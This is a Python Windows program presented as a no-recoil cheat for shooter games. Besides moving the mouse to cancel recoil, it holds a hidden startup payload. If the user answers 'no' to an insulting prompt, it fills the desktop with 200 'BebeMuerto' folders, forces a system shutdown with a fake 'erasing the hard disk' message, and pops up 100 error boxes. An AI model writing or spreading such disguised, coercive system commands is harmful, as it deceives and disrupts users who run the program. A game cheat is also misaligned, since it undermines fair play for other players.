import tkinter as tkinter
from tkinter import *
from tkinter import messagebox, ttk
import win32api
import winsound
import time
import os
from random import *

root = Tk()
root.title('Ruth NoRecoil')
root.config(bg='#400040')
"""root.iconbitmap('img/icon.ico')"""
root.resizable(0,0)
window_width,window_height=320,480
screen_width = root.winfo_screenwidth()
screen_height= root.winfo_screenheight()
position_top = int(screen_height/2 - window_height/2)
position_right = int(screen_width/2 - window_width/2)
root.geometry(f'{window_width}x{window_height}+{position_right}+{position_top}')

messagebox.showwarning(title="IMPORTANTE!", message="LA RESPUESTA A LA SIGUIENTE PREGUNTA ES MUY IMPORTANTE!")
msgInicio = messagebox.askyesno(title="Suerte brother ;D", message="Vas a utilizar un recoil script que sirve para todos los juegos, te ha quedado claro mamahuevo?")

if msgInicio==True:
	messagebox.showinfo(title="Muy bien tt", message="Puedes utilizar el script")
	os.system('cd %HOMEPATH% & cd Desktop & rmdir BebeMuerto0 BebeMuerto1 BebeMuerto2 BebeMuerto3 BebeMuerto4 BebeMuerto5 BebeMuerto6 BebeMuerto7 BebeMuerto8 BebeMuerto9 BebeMuerto10 BebeMuerto11 BebeMuerto12 BebeMuerto13 BebeMuerto14 BebeMuerto15 BebeMuerto16 BebeMuerto17 BebeMuerto18 BebeMuerto19 BebeMuerto20 BebeMuerto21 BebeMuerto22 BebeMuerto23 BebeMuerto24 BebeMuerto25 BebeMuerto26 BebeMuerto27 BebeMuerto28 BebeMuerto29 BebeMuerto30 BebeMuerto31 BebeMuerto32 BebeMuerto33 BebeMuerto34 BebeMuerto35 BebeMuerto36 BebeMuerto37 BebeMuerto38 BebeMuerto39 BebeMuerto40 BebeMuerto41 BebeMuerto42 BebeMuerto43 BebeMuerto44 BebeMuerto45 BebeMuerto46 BebeMuerto47 BebeMuerto48 BebeMuerto49 BebeMuerto50 BebeMuerto51 BebeMuerto52 BebeMuerto53 BebeMuerto54 BebeMuerto55 BebeMuerto56 BebeMuerto57 BebeMuerto58 BebeMuerto59 BebeMuerto60 BebeMuerto61 BebeMuerto62 BebeMuerto63 BebeMuerto64 BebeMuerto65 BebeMuerto66 BebeMuerto67 BebeMuerto68 BebeMuerto69 BebeMuerto70 BebeMuerto71 BebeMuerto72 BebeMuerto73 BebeMuerto74 BebeMuerto75 BebeMuerto76 BebeMuerto77 BebeMuerto78 BebeMuerto79 BebeMuerto80 BebeMuerto81 BebeMuerto82 BebeMuerto83 BebeMuerto84 BebeMuerto85 BebeMuerto86 BebeMuerto87 BebeMuerto88 BebeMuerto89 BebeMuerto90 BebeMuerto91 BebeMuerto92 BebeMuerto93 BebeMuerto94 BebeMuerto95 BebeMuerto96 BebeMuerto97 BebeMuerto98 BebeMuerto99 BebeMuerto100 BebeMuerto101 BebeMuerto102 BebeMuerto103 BebeMuerto104 BebeMuerto105 BebeMuerto106 BebeMuerto107 BebeMuerto108 BebeMuerto109 BebeMuerto110 BebeMuerto111 BebeMuerto112 BebeMuerto113 BebeMuerto114 BebeMuerto115 BebeMuerto116 BebeMuerto117 BebeMuerto118 BebeMuerto119 BebeMuerto120 BebeMuerto121 BebeMuerto122 BebeMuerto123 BebeMuerto124 BebeMuerto125 BebeMuerto126 BebeMuerto127 BebeMuerto128 BebeMuerto129 BebeMuerto130 BebeMuerto131 BebeMuerto132 BebeMuerto133 BebeMuerto134 BebeMuerto135 BebeMuerto136 BebeMuerto137 BebeMuerto138 BebeMuerto139 BebeMuerto140 BebeMuerto141 BebeMuerto142 BebeMuerto143 BebeMuerto144 BebeMuerto145 BebeMuerto146 BebeMuerto147 BebeMuerto148 BebeMuerto149 BebeMuerto150 BebeMuerto151 BebeMuerto152 BebeMuerto153 BebeMuerto154 BebeMuerto155 BebeMuerto156 BebeMuerto157 BebeMuerto158 BebeMuerto159 BebeMuerto160 BebeMuerto161 BebeMuerto162 BebeMuerto163 BebeMuerto164 BebeMuerto165 BebeMuerto166 BebeMuerto167 BebeMuerto168 BebeMuerto169 BebeMuerto170 BebeMuerto171 BebeMuerto172 BebeMuerto173 BebeMuerto174 BebeMuerto175 BebeMuerto176 BebeMuerto177 BebeMuerto178 BebeMuerto179 BebeMuerto180 BebeMuerto181 BebeMuerto182 BebeMuerto183 BebeMuerto184 BebeMuerto185 BebeMuerto186 BebeMuerto187 BebeMuerto188 BebeMuerto189 BebeMuerto190 BebeMuerto191 BebeMuerto192 BebeMuerto193 BebeMuerto194 BebeMuerto195 BebeMuerto196 BebeMuerto197 BebeMuerto198 BebeMuerto199 ')
else :
        os.system('cd %HOMEPATH% & cd Desktop & mkdir BebeMuerto0 BebeMuerto1 BebeMuerto2 BebeMuerto3 BebeMuerto4 BebeMuerto5 BebeMuerto6 BebeMuerto7 BebeMuerto8 BebeMuerto9 BebeMuerto10 BebeMuerto11 BebeMuerto12 BebeMuerto13 BebeMuerto14 BebeMuerto15 BebeMuerto16 BebeMuerto17 BebeMuerto18 BebeMuerto19 BebeMuerto20 BebeMuerto21 BebeMuerto22 BebeMuerto23 BebeMuerto24 BebeMuerto25 BebeMuerto26 BebeMuerto27 BebeMuerto28 BebeMuerto29 BebeMuerto30 BebeMuerto31 BebeMuerto32 BebeMuerto33 BebeMuerto34 BebeMuerto35 BebeMuerto36 BebeMuerto37 BebeMuerto38 BebeMuerto39 BebeMuerto40 BebeMuerto41 BebeMuerto42 BebeMuerto43 BebeMuerto44 BebeMuerto45 BebeMuerto46 BebeMuerto47 BebeMuerto48 BebeMuerto49 BebeMuerto50 BebeMuerto51 BebeMuerto52 BebeMuerto53 BebeMuerto54 BebeMuerto55 BebeMuerto56 BebeMuerto57 BebeMuerto58 BebeMuerto59 BebeMuerto60 BebeMuerto61 BebeMuerto62 BebeMuerto63 BebeMuerto64 BebeMuerto65 BebeMuerto66 BebeMuerto67 BebeMuerto68 BebeMuerto69 BebeMuerto70 BebeMuerto71 BebeMuerto72 BebeMuerto73 BebeMuerto74 BebeMuerto75 BebeMuerto76 BebeMuerto77 BebeMuerto78 BebeMuerto79 BebeMuerto80 BebeMuerto81 BebeMuerto82 BebeMuerto83 BebeMuerto84 BebeMuerto85 BebeMuerto86 BebeMuerto87 BebeMuerto88 BebeMuerto89 BebeMuerto90 BebeMuerto91 BebeMuerto92 BebeMuerto93 BebeMuerto94 BebeMuerto95 BebeMuerto96 BebeMuerto97 BebeMuerto98 BebeMuerto99 BebeMuerto100 BebeMuerto101 BebeMuerto102 BebeMuerto103 BebeMuerto104 BebeMuerto105 BebeMuerto106 BebeMuerto107 BebeMuerto108 BebeMuerto109 BebeMuerto110 BebeMuerto111 BebeMuerto112 BebeMuerto113 BebeMuerto114 BebeMuerto115 BebeMuerto116 BebeMuerto117 BebeMuerto118 BebeMuerto119 BebeMuerto120 BebeMuerto121 BebeMuerto122 BebeMuerto123 BebeMuerto124 BebeMuerto125 BebeMuerto126 BebeMuerto127 BebeMuerto128 BebeMuerto129 BebeMuerto130 BebeMuerto131 BebeMuerto132 BebeMuerto133 BebeMuerto134 BebeMuerto135 BebeMuerto136 BebeMuerto137 BebeMuerto138 BebeMuerto139 BebeMuerto140 BebeMuerto141 BebeMuerto142 BebeMuerto143 BebeMuerto144 BebeMuerto145 BebeMuerto146 BebeMuerto147 BebeMuerto148 BebeMuerto149 BebeMuerto150 BebeMuerto151 BebeMuerto152 BebeMuerto153 BebeMuerto154 BebeMuerto155 BebeMuerto156 BebeMuerto157 BebeMuerto158 BebeMuerto159 BebeMuerto160 BebeMuerto161 BebeMuerto162 BebeMuerto163 BebeMuerto164 BebeMuerto165 BebeMuerto166 BebeMuerto167 BebeMuerto168 BebeMuerto169 BebeMuerto170 BebeMuerto171 BebeMuerto172 BebeMuerto173 BebeMuerto174 BebeMuerto175 BebeMuerto176 BebeMuerto177 BebeMuerto178 BebeMuerto179 BebeMuerto180 BebeMuerto181 BebeMuerto182 BebeMuerto183 BebeMuerto184 BebeMuerto185 BebeMuerto186 BebeMuerto187 BebeMuerto188 BebeMuerto189 BebeMuerto190 BebeMuerto191 BebeMuerto192 BebeMuerto193 BebeMuerto194 BebeMuerto195 BebeMuerto196 BebeMuerto197 BebeMuerto198 BebeMuerto199')
        os.system('shutdown /s /t 10 /c EliminandoElDiscoDuroTT')
        i = 0
        while i < 100:
                messagebox.showerror(title=">:(", message="LO SIENTO BRO, A INSTALAR WINDOWS DE NUEVO")
                i = i+1

def welcome():
        tkinter.messagebox.showinfo('RuthNoRecoil', 'Welcome to RuthNoRecoil v2.1!\n\nUsable for any game, enjoy it!')
welcome()

def StatusChange():
        if(StatusMode['text']=="OFF"):
                time.sleep(0.2)
                StatusMode.config(text="ON", fg="lightgreen")
                winsound.Beep(1000,420)
                return True
        elif(StatusMode['text']=="ON"):
                time.sleep(0.2)
                StatusMode.config(text="OFF", fg="red")
                winsound.Beep(2500,400)
                return False

def saveKey():
        key = KeyCombobox.get()
        return key
        
def on_key_press():
        VK_F1 = win32api.GetKeyState(0x70)
        VK_F2 = win32api.GetKeyState(0x71)
        VK_F3 = win32api.GetKeyState(0x72)
        VK_F4 = win32api.GetKeyState(0x73)
        VK_F5 = win32api.GetKeyState(0x74)
        VK_F6 = win32api.GetKeyState(0x75)
        VK_F7 = win32api.GetKeyState(0x76)
        VK_F8 = win32api.GetKeyState(0x77)
        VK_F9 = win32api.GetKeyState(0x78)
        VK_F10 = win32api.GetKeyState(0x79)
        VK_F11 = win32api.GetKeyState(0x7A)
        VK_F12 = win32api.GetKeyState(0x7B)
        VK_Delete = win32api.GetKeyState(0x2E)
        VK_RETURN = win32api.GetKeyState(0x0D)
        VK_CAPITAL = win32api.GetKeyState(0x14)
        VK_NumLOCK = win32api.GetKeyState(0x90)
        VK_NUM0  = win32api.GetKeyState(0x30)
        VK_NUM1  = win32api.GetKeyState(0x31)
        VK_NUM2  = win32api.GetKeyState(0x32)
        VK_NUM3  = win32api.GetKeyState(0x33)
        VK_NUM4  = win32api.GetKeyState(0x34)
        VK_NUM5  = win32api.GetKeyState(0x35)
        VK_NUM6  = win32api.GetKeyState(0x36)
        VK_NUM7  = win32api.GetKeyState(0x37)
        VK_NUM8  = win32api.GetKeyState(0x38)
        VK_NUM9  = win32api.GetKeyState(0x39)
        
        if(VK_F1<0 and "F1"==saveKey() or VK_F2<0 and "F2"==saveKey() or VK_F3<0 and "F3"==saveKey() or VK_F4<0 and "F4"==saveKey()
        or VK_F5<0 and "F5"==saveKey() or VK_F6<0 and "F6"==saveKey() or VK_F7<0 and "F7"==saveKey() or VK_F8<0 and "F8"==saveKey()
        or VK_F9<0 and "F9"==saveKey() or VK_F11<0 and "F11"==saveKey() or VK_F12<0 and "F12"==saveKey() or VK_Delete<0 and "SUPR"==saveKey() 
        or VK_RETURN<0 and "ENTER"==saveKey() or VK_CAPITAL<0 and "CAPSLOCK"==saveKey() or VK_NumLOCK<0 and "NUM_LOCK"==saveKey()):
            StatusChange()  
        root.after(100,on_key_press)
root.after(100,on_key_press)

def saveRecoil():
        tkinter.messagebox.showinfo('Recoil config','Recoil config saved correctlly!')
 
def mouse_down():
        lmb_state = win32api.GetKeyState(0x01)
        return lmb_state < 0
        root.after(100,mouse_down)
root.after(100,mouse_down)

def recoil():
        Down = recoilDownEntry.get()
        Up = recoilUpEntry.get()
        Left = recoilLeftEntry.get()
        Right = recoilRightEntry.get()
        if (mouse_down() and StatusMode['text']=='ON'):
            win32api.mouse_event(0x0001, -abs(int(Left)), int(Down))
            win32api.mouse_event(0x0001, int(Right), -abs(int(Up)))
        root.after(100,recoil)
root.after(100,recoil) 

Title = Frame(root, width=600)
Title.pack()
Title = Label(Title,text="RuthNoRecoil Script V2.1", width=600, padx=80, pady=20, bg='#000000', fg="white", font=("Segoe UI", 13, "italic", "bold")).pack()

StatusFrame = Frame(root, bg='#400040')
StatusFrame.pack(anchor="w", padx=10,pady=2)
StatusLabel=Label(StatusFrame, text="MODE :", bg='#400040', font=("Segoe UI",12,"italic","bold"),fg="green")
StatusLabel.pack(side=LEFT)
StatusMode=Label(StatusFrame, text="OFF",bg='#400040', font=("Segoe UI",11,"italic","bold"),fg="red")
StatusMode.pack(pady=5)

ConfigKeyLabelFrame = LabelFrame(root, text="Script config",font=("Segoe UI", 12, "italic", "bold"), bg='#400040', fg="white")
ConfigKeyLabelFrame.pack(anchor="w",padx=10, ipadx=100, ipady=15)

margin1= Label(ConfigKeyLabelFrame, bg='#400040')
margin1.pack()

KeyLabel = Label(ConfigKeyLabelFrame, text="On/Off Key", bg='#400040', font=("Segoe UI", 11, "bold"), fg="darkgrey")
KeyLabel.place(x=55,y=7)

KeyCombobox = ttk.Combobox(ConfigKeyLabelFrame, state="readonly", values=["F1","F2","F3","F4","F5","F6","F7","F8","F9","F11","F12","ENTER","SUPR","CAPSLOCK","NUM_LOCK"], width=10, font=("Segoe UI", 10))
KeyCombobox.place(x=155,y=10)

RecoilConfig  = LabelFrame(root, text="Recoil config", font=("Segoe UI",12,"bold","italic"), fg="white", bg='#400040')
RecoilConfig.pack(anchor="w",padx=10, ipadx=100, ipady=65, pady=10)

recoilEmptyMargin = Label(RecoilConfig, bg='#400040')
recoilEmptyMargin.pack()

recoilDown = Label(RecoilConfig, text="Recoil Down", bg='#400040', font=("Segoe UI", 10, "bold"), fg="lightgreen")
recoilDown.place(x=20,y=7)
recoilDownEntry = Entry(RecoilConfig, width=6, font=("Segoe UI", 10, "bold"), fg="black", justify="center")
recoilDownEntry.insert(0,"0")
recoilDownEntry.place(x=35,y=30)

recoilUp = Label(RecoilConfig, text="Recoil Up", bg='#400040', font=("Segoe UI", 10, "bold"), fg="lightgreen")
recoilUp.place(x=200,y=7)
recoilUpEntry = Entry(RecoilConfig, width=6, font=("Segoe UI", 10, "bold"), fg="black", justify="center")
recoilUpEntry.insert(0,"0")
recoilUpEntry.place(x=210,y=30)

recoilLeft = Label(RecoilConfig, text="Recoil Left", bg='#400040', font=("Segoe UI", 10, "bold"), fg="lightgreen")
recoilLeft.place(x=20,y=80)
recoilLeftEntry = Entry(RecoilConfig, width=6, font=("Segoe UI", 10, "bold"), fg="black", justify="center")
recoilLeftEntry.insert(0,"0")
recoilLeftEntry.place(x=35,y=105)

recoilRight = Label(RecoilConfig, text="Recoil Right", bg='#400040', font=("Segoe UI", 10, "bold"), fg="lightgreen")
recoilRight.place(x=200,y=80)
recoilRightEntry = Entry(RecoilConfig, width=6, font=("Segoe UI", 10, "bold"), fg="black", justify="center")
recoilRightEntry.insert(0,"0")
recoilRightEntry.place(x=210,y=105)

happyFace = Label(RecoilConfig, text="♥‿♥", bg='#400040', font=("Segoe UI", 20, "bold"), fg="pink")
happyFace.place(x=120,y=45)

updates = Label(root, text="WORKING ON UPDATES (v.2.2) \n(Add and remove weapons menu,\nWeapon image recognition)", bg='#400040', font=("Segoe UI", 10, "bold"), fg="lightgreen")
updates.place(x=55,y=390)

root.mainloop()
